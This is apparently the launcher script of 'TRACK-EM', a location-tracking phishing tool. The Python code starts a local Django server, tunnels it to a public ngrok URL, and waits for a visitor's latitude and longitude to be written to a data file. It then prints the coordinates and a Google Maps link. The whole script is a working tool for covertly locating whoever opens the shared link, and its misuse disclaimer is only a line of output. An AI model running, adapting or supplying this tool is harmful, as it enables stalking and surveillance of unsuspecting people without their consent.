err = "\033[1;31m"
yel = "\033[1;33m"
suc = "\033[1;32m"

try:
 import os, sys
 from subprocess import Popen,call
 from time import sleep
 from urllib.request import urlopen as url
 from pyngrok import ngrok, conf
 import socket, errno
 import pyfiglet
 from ast import literal_eval as ev
 from datetime import datetime as date
except:
 print(err+" requirements not satisfied"+"""
 try running 'pip install -r requirements.txt'""")
 print("\033[37m")
 sys.exit()

def logo():
 ascii_banner = pyfiglet.figlet_format("TRACK-EM")
 print("\033[1;34m"+ascii_banner)

print("\033c")

try:
 print(err+"checking internet connection...")
 url("http://www.google.com")
 print("\033c")
except:
 print(err+"No internet connection !")
 print("\033[37m")
 sys.exit()

env = dict(os.environ, **{'PYTHONUNBUFFERED':'1'})
logo()
port = str(input(yel+"PORT [recommended (8000-9000)]: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
 s.bind(("127.0.0.1",int(port)))
except socket.error as e:
 if e.errno == errno.EADDRINUSE:
  print(err+"\nPort is already in use ! Try different one .")
  print("\033[37m")
  sys.exit()
 else:
  print(err+e)
  print("\033[37m")
  sys.exit()
s.close()

host = ("127.0.0.1:"+port)
try:
 os.system("touch data/data && rm data/data && touch data/data")
except:
 None
with open(os.devnull,"w") as file :
 server = Popen(["python","track/manage.py","runserver",host],stdout=file,stderr=file,env=env)
 file.flush()

print(suc+"\nconnecting to localhost...\n")

while True:
 try:
  if url("http://"+host):
   break
 except:
  pass

print(suc+"connecting to ngrok...\n"+"\033[1;30m")
sleep(1)
try:
 public_url = ngrok.connect(host,bind_tls=True).public_url
 if (public_url):
  print("\033c")
  logo()
  print("\033[1;36m"+"connected [+]")
  print(yel+"\nlocalhost  : http://"+host)
  print(suc+"\npublic url : "+str(public_url))
except:
 print(err+"\nerror ! cant connect to ngrok")
 Popen.terminate(server)
 print("\033[37m")
 sys.exit()

dat = open("data/data","r")
print("\033[1;37m"+"\nwaiting for credentials...")
while True:
 if len(dat.read()) > 5 :
  sleep(1)
  dat.seek(0)
  val = dat.read().replace("[","").replace("]","")
  data = ev(val)
  print("\n    _________________    \n")
  print(suc+"\nlatitude  : "+data['latitude'])
  print(suc+"\nlongitude : "+data['longitude'])
  break

print(yel+"""

location marked google map link : """+suc+"""\033[1;35m
https://www.google.com/maps/search/?api=1&query={},{}

""".format(data['latitude'],data['longitude']))

dat.close()
name = str(date.now()).replace(" ","_")
os.system("mv data/data data/"+name)

print("\033[1;36meverything gone well !\033[37m")
print("""\ndue to avoid misuse-
connection limited to once at a time !
press 'ctrl + c' to exit  """)
while True:
 try:
  None
 except:
  ngrok.kill()
  Popen.terminate(server)
  sys.exit()
